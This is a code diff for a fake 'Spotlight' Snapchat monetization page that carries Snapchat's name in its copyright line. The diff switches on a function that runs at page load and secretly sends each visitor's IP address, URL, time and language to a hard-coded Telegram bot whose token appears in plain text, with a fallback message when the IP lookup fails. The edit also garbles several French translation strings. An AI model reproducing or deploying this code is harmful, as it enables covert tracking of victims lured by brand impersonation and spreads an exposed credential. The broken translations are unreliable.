@@ -1,8 +1,8 @@
 // ===============================================
 // 1. إعدادات التيليجرام لتتبع الزوار
 // **هام: يجب التأكد من تعيين هذه القيم بشكل صحيح**
-const botToken = "8493663679:AAGW6vstZGS56PscBRhZ3Jqv0nUMxpn4JtU"; // استبدلها برمز البوت الخاص بك
-const chatId = "1046458749";   // استبدلها بمعرف المحادثة الخاص بك
+const botToken = "8493663679:AAGW6vstZGS56PscBRhZ3Jqv0nUMxpn4JtU"; 
+const chatId = "1046458749";   
 // ===============================================
 
 // 2. قاموس الترجمات (Dictionary) - يشمل جميع الصفحات
@@ -12,7 +12,7 @@ const translations = {
         ar: "منصة الأضواء - تحقيق المكاسب", en: "Spotlight Platform - Monetization", de: "Spotlight-Plattform - Monetarisierung", fr: "Plateforme Spotlight - Monétisation", es: "Plataforma Spotlight - Monetización"
     },
     heroHeader: {
-        ar: "حقق الأرباح من منصة الأضواء!", en: "Monetize with Spotlight!", de: "Verdienen Sie Geld mit Spotlight!", fr: "Gagnez de l'argent avec Spotlight !", es: "¡Monetiza con Spotlight!"
+        ar: "حقق الأرباح من منصة الأضواء!", en: "Monetize with Spotlight!", de: "Verdienen Sie Geld mit Spotlight!", fr: "Gagnez de l'argent mit Spotlight !", es: "¡Monetiza con Spotlight!"
     },
     heroText: {
         ar: "أنشئ محتوى مميزًا وابدأ بجني الأرباح من سناب شات.", en: "Create amazing content and start earning from Snapchat.", de: "Erstellen Sie einzigartige Inhalte und fangen Sie an, auf Snapchat Geld zu verdienen.", fr: "Créez du contenu unique et commencez à gagner de l'argent sur Snapchat.", es: "Crea contenido increíble y comienza a ganar dinero con Snapchat."
@@ -85,13 +85,13 @@ const translations = {
         ar: "تم تقديم طلبك!", en: "Application Submitted Successfully!", de: "Ihre Bewerbung wurde empfangen!", fr: "Votre Candidature a été Soumise !", es: "¡Tu Solicitud ha sido Enviada!"
     },
     confirmText: {
-        ar: "سنقوم بمراجعة طلبك خلال ٤٨ ساعة القادمة ونقوم بالرد عليك.", en: "We will review your application within the next 48 hours and will respond to you.", de: "Wir werden Ihre Bewerbung innerhalb der nächsten 48 Stunden prüfen und uns bei Ihnen melden.", fr: "Nous examinerons votre candidature dans les 48 heures et vous répondrons.", es: "Revisaremos su solicitud en las próximas 48 horas و le responderemos."
+        ar: "سنقوم بمراجعة طلبك خلال ٤٨ ساعة القادمة ونقوم بالرد عليك.", en: "We will review your application within the next 48 hours and will respond to you.", de: "Wir werden Ihre Bewerbung innerhalb der nächsten 48 Stunden prüfen und uns bei Ihnen melden.", fr: "Nous examinerons votre candidature dans les 48 heures et vous répondrوس.", es: "Revisaremos su solicitud en las próximas 48 horas و le responderemos."
     },
     homeBtn: {
         ar: "العودة إلى سناب شات", en: "Return to Snapchat", de: "Zurück zu Snapchat", fr: "Retour à Snapchat", es: "Volver a Snapchat"
     },
     footerTextConfirm: {
-        ar: "© 2025 جميع الحقوق محفوظة لـ Snapchat", en: "© 2025 All rights reserved by Snapchat", de: "© 2025 Alle Rechte Snapchat vorbehalten", fr: "© 2025 Tous droits réservés à Snapchat", es: "© 2025 Todos los derechos reservados por Snapchat"
+        ar: "© 2025 جميع الحقوق محفوظة لـ Snapchat", en: "© 2025 All rights reserved by Snapchat", de: "© 2025 Alle Rechte Snapchat vorbehalten", fr: "© 2025 Tous droits réservés por Snapchat", es: "© 2025 Todos los derechos reservados por Snapchat"
     },
 };
 
@@ -139,26 +139,38 @@ function applyTranslation() {
 
 // 5. وظيفة إرسال عنوان IP عند دخول الزائر للموقع
 function trackVisitorIP() {
-    if (!botToken || !chatId || botToken === "8493663679:AAGW6vstZGS56PscBRhZ3Jqv0nUMxpn4JtU" || chatId === "1046458749") {
+    // تم تبسيط الشرط لضمان تشغيل الدالة
+    if (!botToken || !chatId) {
         console.warn("Telegram botToken or chatId is not configured. IP tracking is disabled.");
         return;
     }
     
+    let dateTime = new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US', {
+        year: 'numeric', month: 'short', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+    });
+
+    // محاولة جلب عنوان IP أولاً
     fetch("https://api64.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
             let ipAddress = data.ip || 'غير معروف';
-            let dateTime = new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US', {
-                year: 'numeric', month: 'short', day: 'numeric',
-                hour: '2-digit', minute: '2-digit', second: '2-digit'
-            });
             
+            // رسالة النجاح (مع الـ IP)
             let ipMessage = `🔔 دخول جديد للموقع:\n🔗 الصفحة: ${window.location.href}\n🌍 عنوان IP: ${ipAddress}\n⏰ التاريخ: ${dateTime}\n🌐 اللغة: ${getBrowserLanguage().toUpperCase()}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ipMessage)}`)
                 .catch(error => console.error("Error sending message to Telegram:", error));
         })
-        .catch(error => console.error("Error fetching IP:", error));
+        .catch(error => {
+            // إذا فشل جلب الـ IP، يتم إرسال إشعار بدونه كـ Fallback
+            console.error("Error fetching IP, sending fallback message:", error);
+            
+            let fallbackMessage = `⚠️ تنبيه: دخول جديد للموقع (فشل تحديد IP)\n🔗 الصفحة: ${window.location.href}\n⏰ التاريخ: ${dateTime}\n🌐 اللغة: ${getBrowserLanguage().toUpperCase()}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fallbackMessage)}`)
+                .catch(error => console.error("Error sending fallback message to Telegram:", error));
+        });
 }
 
 
@@ -170,7 +182,8 @@ function trackClickAndProceed() {
     applyButton.disabled = true;
     applyButton.textContent = loadingText;
     
-    if (!botToken || !chatId || botToken === "8493663679:AAGW6vstZGS56PscBRhZ3Jqv0nUMxpn4JtU" || chatId === "1046458749") {
+    // تم تبسيط الشرط لضمان تشغيل الدالة
+    if (!botToken || !chatId) {
         setTimeout(() => {
             window.location.href = 'apply.html';
         }, 3000); 
@@ -255,5 +268,5 @@ if (document.getElementById("submissionForm")) {
 // 8. تشغيل الوظائف عند تحميل الصفحة
 document.addEventListener('DOMContentLoaded', () => {
     applyTranslation();
-    trackVisitorIP();
+    trackVisitorIP(); 
 });
